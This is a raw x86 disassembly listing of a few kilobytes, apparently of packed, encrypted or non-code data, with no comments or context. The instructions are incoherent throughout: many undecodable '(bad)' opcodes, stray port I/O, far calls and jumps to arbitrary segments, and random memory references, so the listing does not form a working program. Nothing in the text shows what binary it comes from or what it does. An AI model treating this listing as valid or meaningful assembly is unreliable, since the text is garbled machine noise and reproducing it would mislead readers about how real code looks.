  41812e:	fwait
  41812f:	mov    ds:0xee8f1ccf,eax
  418134:	xor    esi,DWORD PTR ds:0x2b14955c
  41813a:	or     al,0xec
  41813c:	mov    ah,BYTE PTR [ebx+0x6d8034d]
  418142:	jno    0x4181bd
  418144:	gs xchg edx,eax
  418146:	rcr    BYTE PTR [eax+0x3f5fc5],0x3d
  41814d:	xor    bh,BYTE PTR [eax+0x22]
  418150:	adc    dh,BYTE PTR [edi+0x67]
  418153:	cmp    eax,0x10c6fd5f
  418158:	inc    ecx
  418159:	mov    eax,0xaa4d747
  41815e:	fld    DWORD PTR [ebx-0x41d228d7]
  418164:	mov    al,ds:0x23efce15
  418169:	out    dx,al
  41816a:	jge    0x41811c
  41816c:	lods   eax,DWORD PTR ds:[esi]
  41816d:	scas   eax,DWORD PTR es:[edi]
  41816e:	mov    bh,0x76
  418170:	loopne 0x41816d
  418172:	and    al,0xdc
  418174:	inc    edx
  418175:	mov    al,0xf2
  418177:	scas   al,BYTE PTR es:[edi]
  418178:	arpl   WORD PTR [edi],si
  41817a:	or     ebx,ebx
  41817c:	dec    edx
  41817d:	push   ecx
  41817e:	pop    esp
  41817f:	cwde   
  418180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418181:	out    dx,eax
  418182:	sti    
  418183:	inc    eax
  418184:	and    ebp,DWORD PTR [ecx+0x6452510b]
  41818a:	outs   dx,DWORD PTR ds:[esi]
  41818b:	jle    0x418143
  41818d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41818e:	pop    ecx
  41818f:	cld    
  418190:	retf   
  418191:	adc    BYTE PTR [ebp+eiz*4-0x12],bl
  418195:	mov    al,ds:0xf5545d74
  41819a:	stc    
  41819b:	sbb    al,BYTE PTR [edx]
  41819d:	(bad)  [ebp-0x515d84ca]
  4181a3:	mov    esp,0x66cf6f19
  4181a8:	jge    0x418177
  4181aa:	iret   
  4181ab:	outs   dx,DWORD PTR ds:[esi]
  4181ac:	cld    
  4181ad:	xor    ah,BYTE PTR [ebp+0x654520be]
  4181b3:	repnz adc BYTE PTR [edi+0x59],dh
  4181b7:	dec    edi
  4181b8:	imul   esp,edx,0x1d7860b
  4181be:	add    al,0x3
  4181c0:	push   edi
  4181c2:	jmp    0xc7c1:0xa8bd1c69
  4181c9:	retf   0xb46c
  4181cc:	ja     0x418171
  4181ce:	xchg   BYTE PTR [edx-0x1cc44c27],al
  4181d4:	rcr    BYTE PTR [ecx],1
  4181d6:	push   esi
  4181d7:	or     BYTE PTR [edx],dl
  4181d9:	or     bl,al
  4181db:	rcl    DWORD PTR [esi-0x6],0x5b
  4181df:	fist   DWORD PTR [eax-0x2ff9f7e3]
  4181e5:	clc    
  4181e6:	cmp    cl,BYTE PTR [ecx+0x39]
  4181e9:	jb     0x418251
  4181eb:	jmp    0x418208
  4181ed:	xchg   esi,eax
  4181ee:	adc    ebx,DWORD PTR [ebp+ecx*4+0x647d84bb]
  4181f5:	aas    
  4181f6:	cwde   
  4181f7:	jne    0x418196
  4181f9:	push   ss
  4181fa:	inc    edx
  4181fb:	ret    
  4181fc:	push   ss
  4181fd:	pop    ebp
  4181fe:	xchg   ecx,eax
  4181ff:	aad    0x21
  418201:	add    edi,DWORD PTR [ebx-0x76]
  418204:	or     esi,0xfffffffa
  418207:	repnz pop eax
  418209:	ds inc esp
  41820b:	pop    es
  41820c:	mov    edx,0x3d3dcd4
  418211:	addr16 jmp 0x418254
  418214:	aaa    
  418215:	push   0xffffffcd
  418217:	or     eax,0xe23921e6
  41821c:	scas   al,BYTE PTR es:[edi]
  41821d:	(bad)  
  41821e:	loope  0x418202
  418220:	sar    BYTE PTR [ecx+0x5a],0xf8
  418224:	ins    BYTE PTR es:[edi],dx
  418225:	pop    edi
  418226:	add    DWORD PTR [edx+0x4d],edx
  418229:	push   cs
  41822a:	mov    eax,ds:0x313f2cf3
  41822f:	lods   al,BYTE PTR ds:[esi]
  418230:	inc    ebp
  418231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418232:	jo     0x418282
  418234:	or     dl,bl
  418236:	sub    cl,cl
  418238:	mov    esi,0xaefcc9aa
  41823d:	add    edx,eax
  41823f:	aad    0xb2
  418241:	js     0x4181e0
  418243:	jmp    0x1ebbe442
  418248:	out    dx,al
  418249:	cld    
  41824a:	fst    DWORD PTR [ebp+0x4e]
  41824d:	fisttp DWORD PTR [eax-0x42ac6862]
  418253:	imul   ebp,DWORD PTR [edx-0x4bd97a2e],0x6be9264e
  41825d:	jecxz  0x418254
  41825f:	aam    0x1b
  418261:	int    0x7
  418263:	and    DWORD PTR [eax],ebp
  418265:	imul   edx,ecx,0xffffff8f
  418268:	add    BYTE PTR [ebx-0x24792851],ah
  41826e:	xor    edi,DWORD PTR [edi]
  418270:	shl    BYTE PTR [esi-0x66],0xac
  418274:	add    dl,BYTE PTR ds:0x61c0ba19
  41827a:	stos   BYTE PTR es:[edi],al
  41827b:	clc    
  41827c:	pxor   mm4,mm1
  41827f:	dec    esp
  418280:	mov    esi,0xf94c9853
  418285:	sub    eax,0x6c646bf8
  41828a:	ret    0x4616
  41828d:	stos   DWORD PTR es:[edi],eax
  41828e:	in     eax,dx
  41828f:	mov    esi,0xf64e8d0e
  418294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418295:	je     0x418291
  418297:	popa   
  418298:	(bad)  
  418299:	jmp    0x2a69bfe6
  41829e:	ja     0x41830a
  4182a0:	xor    al,0x5a
  4182a2:	inc    esi
  4182a3:	cmp    cl,al
  4182a5:	xchg   di,ax
  4182a7:	jg     0x41831c
  4182a9:	scas   eax,DWORD PTR es:[edi]
  4182aa:	daa    
  4182ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182ac:	sbb    esi,DWORD PTR [ebp+0x56d1bd21]
  4182b2:	xchg   ebx,eax
  4182b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182b4:	push   cs
  4182b5:	retf   
  4182b6:	jge    0x418289
  4182b8:	mov    bl,cl
  4182ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182bb:	sahf   
  4182bc:	lods   eax,DWORD PTR ds:[esi]
  4182bd:	push   ebx
  4182be:	in     al,0xc5
  4182c0:	frstor [edx]
  4182c2:	or     al,0x34
  4182c4:	xchg   ebp,eax
  4182c5:	outs   dx,BYTE PTR ds:[esi]
  4182c6:	stc    
  4182c7:	dec    DWORD PTR [eax]
  4182c9:	dec    eax
  4182ca:	and    al,0x11
  4182cc:	xchg   ecx,eax
  4182cd:	dec    esp
  4182ce:	jbe    0x41831d
  4182d0:	and    ch,bh
  4182d2:	pop    ss
  4182d3:	cdq    
  4182d4:	out    0x3d,eax
  4182d6:	mov    ds:0x166b3db,al
  4182db:	test   al,0x21
  4182dd:	inc    esi
  4182de:	dec    esi
  4182df:	div    BYTE PTR [edi]
  4182e1:	xchg   ecx,eax
  4182e2:	jns    0x41827a
  4182e4:	or     DWORD PTR [ecx-0x28],edi
  4182e7:	cli    
  4182e8:	jge    0x41829c
  4182ea:	dec    ecx
  4182eb:	dec    ebp
  4182ec:	cmp    eax,0x2077543b
  4182f1:	or     esi,DWORD PTR [ebx]
  4182f3:	call   0x5fa:0x2f6b15d6
  4182fa:	add    DWORD PTR [esi],eax
  4182fc:	and    eax,0x1f382d0c
  418301:	bound  ecx,QWORD PTR [ebx]
  418303:	fnstcw WORD PTR [ebx]
  418305:	rcl    BYTE PTR [ebx+0x59b7f133],1
  41830b:	adc    DWORD PTR [ecx+0x15],ebp
  41830e:	popf   
  41830f:	mov    eax,ebp
  418311:	jno    0x4182f0
  418313:	(bad)  
  418314:	pop    edx
  418315:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418317:	dec    edx
  418318:	loope  0x41833a
  41831a:	add    al,0xb4
  41831c:	push   es
  41831d:	adc    ecx,ebx
  41831f:	xchg   esp,eax
  418320:	cli    
  418321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418322:	mov    dh,0x87
  418324:	int    0x44
  418326:	out    0xae,al
  418328:	gs fadd st(4),st
  41832b:	push   esp
  41832c:	or     dl,BYTE PTR [edi+0x4364b75d]
  418332:	xchg   ebx,eax
  418333:	push   edx
  418334:	cwde   
  418335:	je     0x4182c5
  418337:	dec    edi
  418338:	fild   DWORD PTR [ecx-0x31]
  41833b:	mov    al,0xa4
  41833d:	mov    eax,ds:0xc7d27c2a
  418342:	ret    
  418343:	test   al,0x6b
  418345:	ror    DWORD PTR [ecx-0x5d7f1708],1
  41834b:	jl     0x418305
  41834d:	jl     0x4183af
  41834f:	mov    edx,0xb28a1eed
  418354:	push   cs
  418355:	icebp  
  418356:	pusha  
  418357:	clc    
  418358:	je     0x41838b
  41835a:	and    ch,bh
  41835c:	pop    ss
  41835d:	aaa    
  41835e:	mov    dl,0xe0
  418360:	push   es
  418361:	rol    ecx,cl
  418363:	(bad)  
  418364:	fisubr WORD PTR [edx+0x43]
  418367:	into   
  418368:	rcl    DWORD PTR [edx],cl
  41836a:	popa   
  41836b:	iret   
  41836c:	pop    ds
  41836d:	inc    esi
  41836e:	enter  0xd63b,0xa4
  418372:	loope  0x41838e
  418374:	inc    ebx
  418375:	loopne 0x4183db
  418377:	(bad)  
  418378:	xor    al,0x34
  41837a:	jge    0x4183c8
  41837c:	inc    esi
  41837d:	mov    ecx,0x8adc7fdd
  418382:	and    al,0xcf
  418384:	int    0x30
  418386:	shr    ch,0xbc
  418389:	call   0xb141:0xc90a7aa3
  418390:	hlt    
  418391:	(bad)  
  418393:	add    DWORD PTR fs:[ebp-0x69],ebx
  418397:	int3   
  418398:	mov    al,0x6f
  41839a:	retf   
  41839b:	pop    esi
  41839c:	xor    eax,0xfc8aeff1
  4183a1:	leave  
  4183a2:	jne    0x418398
  4183a4:	mov    ds:0x3a3fdc07,al
  4183a9:	enter  0x127f,0xc9
  4183ad:	lods   al,BYTE PTR ds:[esi]
  4183ae:	sbb    eax,0xb2efc052
  4183b3:	(bad)  
  4183b4:	cld    
  4183b5:	dec    esp
  4183b6:	adc    BYTE PTR [edi+esi*8],cl
  4183b9:	inc    edx
  4183ba:	adc    eax,0x1568d783
  4183bf:	scas   eax,DWORD PTR es:[edi]
  4183c0:	or     al,BYTE PTR [ecx+0x69]
  4183c3:	mov    bl,0x6b
  4183c5:	push   es
  4183c6:	call   0x6f5f:0x901abef8
  4183cd:	addr16 stc 
  4183cf:	in     al,0xe3
  4183d1:	and    bl,BYTE PTR [esi+0x4d]
  4183d4:	xor    BYTE PTR [esi-0xeaf326c],bh
  4183da:	iret   
  4183db:	adc    ah,BYTE PTR [edi+edi*4-0x5dec9bc2]
  4183e2:	sar    BYTE PTR [edi-0x12e12996],cl
  4183e8:	repnz es push ecx
  4183eb:	imul   esp,edx,0xfffffff8
  4183ee:	cmp    ah,dl
  4183f0:	mov    ?,esi
  4183f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183f3:	add    DWORD PTR [ecx-0x1d],ebp
  4183f6:	jb     0x4183de
  4183f8:	cmp    al,0xc2
  4183fa:	(bad)  
  4183fc:	fs xchg ebx,eax
  4183fe:	retf   0x4c5f
  418401:	aam    0xe6
  418403:	stos   BYTE PTR es:[edi],al
  418404:	sbb    DWORD PTR [ebx],edx
  418406:	popa   
  418407:	or     BYTE PTR es:[ebx+eiz*8],dl
  41840b:	adc    ebx,DWORD PTR [eax]
  41840d:	inc    ebp
  41840e:	aad    0x75
  418410:	push   ebp
  418411:	adc    BYTE PTR [edx-0x39],bl
  418414:	mov    ds:0x98c38ce3,al
  418419:	pusha  
  41841a:	jb     0x418467
  41841c:	mov    cl,ah
  41841e:	mul    BYTE PTR [ebp+0x1b3c0a54]
  418424:	xchg   edi,eax
  418425:	dec    ebp
  418426:	fadd   DWORD PTR [ecx+0x32240cc]
  41842c:	fnstsw WORD PTR [eax+edi*1-0x2463533f]
  418433:	pop    ss
  418434:	lock pop ecx
  418436:	jbe    0x418471
  418438:	arpl   WORD PTR [edx],bp
  41843a:	call   0x5092ab83
  41843f:	call   0xac18b99d
  418444:	ins    DWORD PTR es:[edi],dx
  418445:	sbb    DWORD PTR [ecx],edx
  418447:	mov    edx,0xcef54a29
  41844c:	cmp    al,0xdd
  41844e:	jae    0x418432
  418450:	and    eax,0x32b2e708
  418455:	inc    esp
  418456:	fwait
  418457:	lods   al,BYTE PTR ds:[esi]
  418458:	jecxz  0x4184c4
  41845a:	(bad)  
  41845c:	pop    es
  41845d:	cwde   
  41845e:	rcl    eax,1
  418460:	(bad)  
  418461:	cmp    eax,0xdb71e271
  418466:	push   esp
  418467:	repz shl DWORD PTR [eax-0x3c9aa3c8],1
  41846e:	pop    ecx
  41846f:	dec    edi
  418470:	and    ecx,ebp
  418472:	sti    
  418473:	repnz test eax,0x369e5cb9
  418479:	jge    0x4184b8
  41847b:	inc    ecx
  41847c:	sub    eax,esi
  41847e:	imul   esi,DWORD PTR [edi],0x1e
  418481:	es xor eax,0x3f5113a9
  418487:	jae    0x418462
  418489:	test   DWORD PTR ss:[ebp+0x6f405912],ebp
  418490:	or     ebp,esi
  418492:	pop    edx
  418493:	js     0x418458
  418495:	loopne 0x418432
  418497:	mov    esi,0x2c81db7
  41849c:	call   0x13b0:0x5e12ebb1
  4184a3:	pop    esi
  4184a4:	or     al,0x90
  4184a6:	push   ebx
  4184a7:	ins    DWORD PTR es:[edi],dx
  4184a8:	in     eax,dx
  4184a9:	enter  0xdd9b,0x42
  4184ad:	jmp    0x41850c
  4184af:	mov    ds:0x864283ad,al
  4184b4:	cdq    
  4184b5:	sub    edi,DWORD PTR [edi-0x26]
  4184b8:	jb     0x41843e
  4184ba:	(bad)  
  4184bb:	xlat   BYTE PTR ds:[ebx]
  4184bc:	and    al,0x4c
  4184be:	jmp    0x180ab813
  4184c3:	pop    ebp
  4184c4:	(bad)  
  4184c6:	xchg   ebx,eax
  4184c7:	inc    eax
  4184c8:	mov    ds:0xc646389c,eax
  4184cd:	mov    ebx,0x88af08db
  4184d2:	pop    eax
  4184d3:	stos   BYTE PTR es:[edi],al
  4184d4:	jno    0x4184ed
  4184d6:	xor    bh,BYTE PTR [ebp-0x4fe29673]
  4184dc:	add    cl,dl
  4184de:	aam    0x34
  4184e0:	das    
  4184e1:	add    eax,0x54a17dc
  4184e6:	xchg   BYTE PTR [ebp+0x51],bl
  4184e9:	ss push ebp
  4184eb:	mov    ebp,0xfd220cb0
  4184f0:	scas   al,BYTE PTR es:[edi]
  4184f1:	es dec esp
  4184f3:	pop    ds
  4184f4:	jo     0x41849f
  4184f6:	xor    eax,0x79dbf18f
  4184fb:	add    al,BYTE PTR [ebp+ebx*4-0x73563774]
  418502:	rep ins BYTE PTR es:[edi],dx
  418504:	mov    ?,edi
  418506:	or     bh,ah
  418508:	or     BYTE PTR [edi+0x5e],dl
  41850b:	shl    DWORD PTR [edi],cl
  41850d:	jl     0x418543
  41850f:	mov    al,0x8b
  418511:	cmp    al,0x4d
  418513:	(bad)  
  418514:	sbb    BYTE PTR cs:[eax],0x6e
  418518:	popf   
  418519:	shl    DWORD PTR [eax-0x25d990f],cl
  41851f:	xchg   edi,eax
  418520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418521:	pop    ebp
  418522:	in     al,dx
  418523:	rcl    BYTE PTR [ebp+0x48],1
  418526:	iret   
  418527:	hlt    
  418528:	lock fwait
  41852a:	pop    edx
  41852b:	out    0x12,eax
  41852d:	fisttp WORD PTR [esi+ebp*1+0x30de990]
  418534:	aaa    
  418535:	xchg   edi,eax
  418536:	outs   dx,DWORD PTR ds:[esi]
  418537:	pop    eax
  418538:	in     al,0xbe
  41853a:	sbb    al,0xdc
  41853c:	retf   0x178c
  41853f:	xchg   ecx,eax
  418540:	or     dh,BYTE PTR [edx+0x49]
  418543:	in     eax,dx
  418544:	or     al,0x55
  418546:	jae    0x4184cd
  418548:	jl     0x4184d5
  41854a:	mov    cl,0x41
  41854c:	add    cl,BYTE PTR ds:0xc712dfac
  418552:	xchg   ebx,eax
  418553:	shl    DWORD PTR [edx],0xc8
  418556:	jle    0x418515
  418558:	dec    edx
  418559:	out    dx,al
  41855a:	lods   al,BYTE PTR ds:[esi]
  41855b:	push   ebx
  41855c:	sbb    ch,ch
  41855e:	push   es
  41855f:	xchg   ebx,eax
  418560:	sub    bl,BYTE PTR [ecx+0x6b314ce0]
  418566:	sbb    al,0x9e
  418568:	fs pushf 
  41856a:	xor    DWORD PTR [ecx],ecx
  41856c:	xchg   ecx,eax
  41856d:	mov    WORD PTR [edi+0x7b],ds
  418570:	xor    BYTE PTR [ecx+0x1fb72bfa],bh
  418576:	popa   
  418577:	call   0x5078:0x791c8662
  41857e:	xchg   DWORD PTR [eax+0x1c],esp
  418581:	fmul   QWORD PTR [edx]
  418583:	mov    edx,ebx
  418585:	mov    ebx,0x11a7f30c
  41858a:	out    0x54,al
  41858c:	dec    edx
  41858d:	(bad)
  418590:	addr16 or dl,bl
  418593:	dec    ecx
  418594:	push   esp
  418595:	jp     0x4185b8
  418597:	test   BYTE PTR [ebp+0x31073d],cl
  41859d:	push   ebx
  41859e:	out    dx,al
  41859f:	cs call 0x6eb735a1
  4185a5:	inc    esi
  4185a6:	mov    dh,BYTE PTR [eax]
  4185a8:	lods   eax,DWORD PTR ds:[esi]
  4185a9:	ins    DWORD PTR es:[edi],dx
  4185aa:	outs   dx,DWORD PTR ds:[esi]
  4185ab:	or     DWORD PTR [esi],edi
  4185ad:	inc    edi
  4185ae:	test   al,0xaf
  4185b0:	xchg   esi,eax
  4185b1:	outs   dx,DWORD PTR ds:[esi]
  4185b2:	lds    ebx,FWORD PTR [edx]
  4185b4:	inc    esp
  4185b5:	int    0x28
  4185b7:	mov    ecx,0x54e9535e
  4185bc:	mov    ch,0x31
  4185bf:	retf   
  4185c0:	sbb    eax,0x2949f9f1
  4185c5:	mov    eax,0xf45f3a85
  4185ca:	dec    esi
  4185cb:	in     al,0x44
  4185cd:	(bad)  
  4185ce:	jmp    0x4185c3
  4185d0:	ins    BYTE PTR es:[edi],dx
  4185d1:	sub    al,0x96
  4185d3:	xor    bh,BYTE PTR [ecx+0x46050a37]
  4185d9:	shl    BYTE PTR [ebx],0x4b
  4185dc:	stc    
  4185dd:	mov    eax,ds:0x1fabd47d
  4185e2:	sbb    BYTE PTR [ebx-0x30371f9b],ah
  4185e8:	int3   
  4185e9:	adc    esp,ecx
  4185eb:	jg     0x41864b
  4185ed:	xchg   esp,eax
  4185ee:	dec    ebx
  4185ef:	xchg   esi,eax
  4185f0:	(bad)  
  4185f1:	pop    edi
  4185f2:	push   0x1
  4185f4:	and    DWORD PTR [ebp+0x2b2384c4],edx
  4185fa:	imul   ebp,DWORD PTR [ebx-0x10],0xfffffffd
  4185fe:	dec    ecx
  4185ff:	and    esp,DWORD PTR [edx-0x34fd95e]
  418605:	fsub   QWORD PTR [ebx+0x3]
  418608:	lods   eax,DWORD PTR ds:[esi]
  418609:	adc    DWORD PTR [esi],ebp
  41860b:	js     0x418653
  41860d:	clc    
  41860e:	and    DWORD PTR [edx-0x4],ecx
  418611:	jb     0x418644
  418613:	shl    BYTE PTR [eax+0x2de97a88],0xba
  41861a:	sub    BYTE PTR [ebx+0x71],0x89
  41861e:	in     al,0xa4
  418620:	in     al,dx
  418621:	xchg   edx,eax
  418622:	mov    al,0x93
  418624:	sub    ah,BYTE PTR [ebx-0x7627ccdf]
  41862a:	cmp    edi,DWORD PTR [ecx+0x5a]
  41862d:	mov    al,0x44
  41862f:	cmp    eax,0x1bb57dd1
  418634:	add    BYTE PTR [edx],al
  418636:	popf   
  418637:	mov    edx,0x938f2e71
  41863c:	je     0x418614
  41863e:	sbb    ecx,ebx
  418640:	out    dx,eax
  418641:	inc    ebp
  418642:	arpl   dx,cx
  418644:	lods   eax,DWORD PTR ds:[esi]
  418645:	cmp    esp,edx
  418647:	dec    esi
  418648:	sub    eax,0x28a329ff
  41864d:	sbb    BYTE PTR [edx-0x4b],ah
  418650:	mov    ah,0x1d
  418652:	or     eax,DWORD PTR [edx]
  418654:	pop    edi
  418655:	aad    0x17
  418657:	jp     0x4186a1
  418659:	out    0x8d,al
  41865b:	repz inc ebx
  41865d:	sub    edi,DWORD PTR [esi+0x54]
  418660:	sbb    esp,DWORD PTR [ebx]
  418662:	jbe    0x418669
  418664:	test   BYTE PTR [ebp-0x26],dh
  418667:	xor    eax,0xc1a2f399
  41866c:	pop    esp
  41866d:	sbb    edi,0x8569da0f
  418673:	outs   dx,BYTE PTR ds:[esi]
  418674:	pop    ebp
  418675:	jp     0x418681
  418677:	jecxz  0x4186ce
  418679:	mov    DWORD PTR [ebp+0x4],edi
  41867c:	cmp    ebx,DWORD PTR [edi+0x1b11a12]
  418682:	in     eax,dx
  418683:	rcl    ebx,0x0
  418686:	and    ebx,DWORD PTR [edi+ecx*1+0x42a2a82]
  41868d:	cdq    
  41868e:	pop    ss
  41868f:	neg    DWORD PTR [edi+0x7]
  418692:	not    BYTE PTR [esi]
  418694:	mov    edi,0x2baa03f1
  418699:	inc    esi
  41869a:	pop    ecx
  41869b:	movaps XMMWORD PTR [edx],xmm6
  41869e:	mov    edi,0x56698661
  4186a3:	ja     0x418644
  4186a5:	push   cs
  4186a6:	adc    DWORD PTR [edi+edx*4+0x58],ebp
  4186aa:	dec    edx
  4186ab:	mov    cl,0xfa
  4186ad:	xor    BYTE PTR [esi],cl
  4186af:	dec    ecx
  4186b0:	push   esi
  4186b1:	pusha  
  4186b2:	push   0xb
  4186b4:	(bad)  
  4186b5:	or     ebp,esi
  4186b7:	(bad)  
  4186b9:	aas    
  4186ba:	push   eax
  4186bb:	(bad)  
  4186bc:	ja     0x418734
  4186be:	int3   
  4186bf:	pop    esp
  4186c0:	fstp   DWORD PTR [edi]
  4186c2:	mov    ds:0x7969e397,eax
  4186c7:	xor    BYTE PTR gs:[eax+ebp*2+0x13],bl
  4186cc:	fld    QWORD PTR [edi]
  4186ce:	lahf   
  4186cf:	add    al,0x60
  4186d1:	and    al,0x47
  4186d3:	mov    dh,0x9b
  4186d5:	ss out dx,al
  4186d7:	push   0xc
  4186d9:	stos   BYTE PTR es:[edi],al
  4186da:	cmp    bh,dh
  4186dc:	out    dx,al
  4186dd:	xchg   edi,eax
  4186de:	or     BYTE PTR [ecx],ah
  4186e0:	xchg   ebx,eax
  4186e1:	sbb    al,0x2b
  4186e3:	adc    bh,BYTE PTR [eax+0x1536436d]
  4186e9:	add    eax,0xa014d5e2
  4186ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186ef:	jle    0x4186ee
  4186f1:	jmp    0x18adf5b9
  4186f6:	mov    dh,BYTE PTR [ecx]
  4186f8:	dec    ecx
  4186f9:	stos   DWORD PTR es:[edi],eax
  4186fa:	test   al,0x12
  4186fc:	mov    edi,0x5938743e
  418701:	aad    0x34
  418703:	(bad)  
  418704:	mov    esi,0x96c82355
  418709:	pop    edi
  41870a:	or     eax,0xf25239a7
  41870f:	dec    edi
  418710:	int    0xf5
  418712:	or     edi,DWORD PTR [edx-0x6c]
  418715:	inc    eax
  418716:	fsub   DWORD PTR [ecx+0x50]
  418719:	xchg   BYTE PTR [ecx-0x65],ah
  41871c:	cmp    edx,DWORD PTR [ecx-0x2f]
  41871f:	std    
  418720:	xor    DWORD PTR [ecx-0x3c6c6b5c],eax
  418726:	xor    DWORD PTR [edi],esi
  418728:	dec    esi
  418729:	retf   
  41872a:	in     eax,0xcd
  41872c:	repz loope 0x418701
  41872f:	xchg   DWORD PTR [esi-0x25],ebx
  418732:	sub    ebx,edx
  418734:	inc    eax
  418735:	(bad)  
  418737:	rol    BYTE PTR [edi],cl
  418739:	inc    esi
  41873a:	mov    ecx,0x45bf15fc
  41873f:	cmp    bh,BYTE PTR [edi-0x18621ea4]
  418745:	jle    0x4187c3
  418747:	imul   ecx,DWORD PTR es:[esi-0x49ae9f40],0x22a66e00
  418752:	adc    ebp,esi
  418754:	mov    WORD PTR [esi],ds
  418756:	retf   
  418757:	loopne 0x4186e0
  418759:	shl    DWORD PTR [ebp+0xbd73700],1
  41875f:	mov    edx,0x6b5c61fa
  418764:	pop    edx
  418765:	mov    al,ds:0x5e185e09
  41876a:	cmp    al,0xdb
  41876c:	add    al,0x99
  41876e:	retf   
  41876f:	pop    ebp
  418770:	jbe    0x418795
  418772:	mov    esp,DWORD PTR [esi-0x406e3881]
  418778:	pushf  
  418779:	test   eax,0x713fc5e
  41877e:	jbe    0x41871b
  418780:	sub    ah,BYTE PTR [ebx-0x68058446]
  418786:	ins    DWORD PTR es:[edi],dx
  418787:	jp     0x4187b6
  418789:	mov    dl,0xea
  41878b:	sub    al,0x76
  41878d:	aam    0xad
  41878f:	add    dh,0x2b
  418792:	sub    al,0x51
  418794:	mov    ebx,0xc68c4888
  418799:	push   esi
  41879a:	test   al,0x24
  41879c:	add    eax,0x71a3f056
  4187a1:	cli    
  4187a2:	sbb    bh,BYTE PTR [ebx-0x48]
  4187a5:	cmp    ch,bl
  4187a7:	cli    
  4187a8:	push   ecx
  4187a9:	pop    edx
  4187aa:	jne    0x4187b6
  4187ac:	jge    0x4187b0
  4187ae:	mov    esp,0xf404b214
  4187b3:	sub    BYTE PTR [ebx+0x65],bl
  4187b6:	sbb    BYTE PTR [ebx-0x17615ce9],0x21
  4187bd:	dec    esp
  4187be:	pop    ss
  4187bf:	sub    ebp,DWORD PTR [ebp-0x69]
  4187c2:	cwde   
  4187c3:	lods   al,BYTE PTR ds:[esi]
  4187c4:	dec    eax
  4187c5:	add    BYTE PTR [ecx],ah
  4187c7:	pop    ss
  4187c8:	mov    dl,BYTE PTR [esi]
  4187ca:	into   
  4187cb:	push   ds
  4187cc:	mov    dh,ch
  4187ce:	pop    ebp
  4187cf:	push   0x5e
  4187d1:	jle    0x4187f1
  4187d3:	shr    DWORD PTR fs:[ecx-0xa],0x2c
  4187d8:	mov    cl,0xe9
  4187da:	gs push esi
  4187dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187dd:	nop
  4187de:	in     eax,dx
  4187df:	add    eax,0x499ebc4e
  4187e4:	xchg   ebx,eax
  4187e5:	cdq    
  4187e6:	sbb    esi,DWORD PTR [edi-0x5c]
  4187e9:	aas    
  4187ea:	enter  0x7d0f,0xd6
  4187ee:	xchg   ebp,eax
  4187ef:	int    0x70
  4187f1:	adc    al,BYTE PTR [ebx+0x29]
  4187f4:	adc    BYTE PTR [ebx+0x7e],0xc9
  4187f8:	sub    BYTE PTR [esi-0x3f],bh
  4187fb:	mov    ebx,0x2dc3cdda
  418800:	je     0x41882f
  418802:	cmp    esp,DWORD PTR [eax]
  418804:	mov    esi,0x17435fbd
  418809:	stc    
  41880a:	out    0x36,al
  41880c:	jno    0x41886c
  41880e:	fnstenv [esp+ecx*2]
  418811:	je     0x4187b4
  418813:	(bad)  
  418815:	aaa    
  418816:	inc    eax
  418817:	imul   esp,DWORD PTR [edx-0x420eda69],0xffffffbc
  41881e:	retf   0x7f61
  418821:	fnstcw WORD PTR [edi]
  418823:	push   ecx
  418824:	pop    esp
  418825:	pop    ebp
  418826:	fisttp DWORD PTR [ecx-0x61]
  418829:	retf   
  41882a:	mov    esi,edx
  41882c:	ins    BYTE PTR es:[edi],dx
  41882d:	mov    bh,0xca
  41882f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418830:	inc    esp
  418831:	pusha  
  418832:	pop    ebx
  418833:	out    dx,eax
  418834:	jns    0x41889e
  418836:	loope  0x4188b5
  418838:	and    DWORD PTR [ebx-0x46],edx
  41883b:	push   cs
  41883c:	xchg   ebx,eax
  41883d:	scas   al,BYTE PTR es:[edi]
  41883e:	add    bh,al
  418840:	push   edx
  418841:	mov    ebx,0xd8cd3bbf
  418846:	pop    esp
  418847:	das    
  418848:	mul    dl
  41884a:	sbb    ah,BYTE PTR [esi+0x277abe69]
  418850:	test   DWORD PTR [ebp-0x6acc6133],esi
  418856:	dec    esi
  418857:	mov    esp,0x1dc55d96
  41885c:	jae    0x4188a2
  41885e:	or     al,0xaa
  418860:	ins    DWORD PTR es:[edi],dx
  418861:	jo     0x418873
  418863:	out    0x52,al
  418865:	ss mov ah,0x54
  418868:	mov    ebx,0x640655cd
  41886d:	sub    bh,BYTE PTR [esi+0xc]
  418870:	sub    al,0x60
  418872:	gs pop ebp
  418874:	(bad)  
  418875:	mov    edi,0x43de1a01
  41887a:	jb     0x4188a9
  41887c:	xlat   BYTE PTR ds:[ebx]
  41887d:	leave  
  41887e:	sbb    al,0xdb
  418880:	cld    
  418881:	sub    eax,0x4fa75f35
  418886:	js     0x41886f
  418888:	dec    ebx
  418889:	imul   ebp,DWORD PTR [esi+0x60d541a4],0x9a6b0c16
  418893:	adc    ah,BYTE PTR [ecx-0x7e6defe1]
  418899:	pop    esp
  41889a:	or     ebp,DWORD PTR [eax-0x62b9c6cc]
  4188a0:	stos   DWORD PTR es:[edi],eax
  4188a1:	(bad)  
  4188a2:	icebp  
  4188a3:	out    dx,al
  4188a4:	fpatan 
  4188a6:	sahf   
  4188a7:	jp     0x418832
  4188a9:	xlat   BYTE PTR ds:[ebx]
  4188aa:	add    BYTE PTR ds:0xc65461de,al
  4188b0:	jge    0x4188bb
  4188b2:	pop    ss
  4188b3:	sti    
  4188b4:	inc    ecx
  4188b5:	js     0x418872
  4188b7:	div    DWORD PTR [edx+0x4be742b0]
  4188bd:	idiv   DWORD PTR [ecx-0x5]
  4188c0:	bound  edi,QWORD PTR [esi+eiz*2+0x50]
  4188c4:	pop    es
  4188c5:	pop    ecx
  4188c6:	sahf   
  4188c7:	and    BYTE PTR [eax],ch
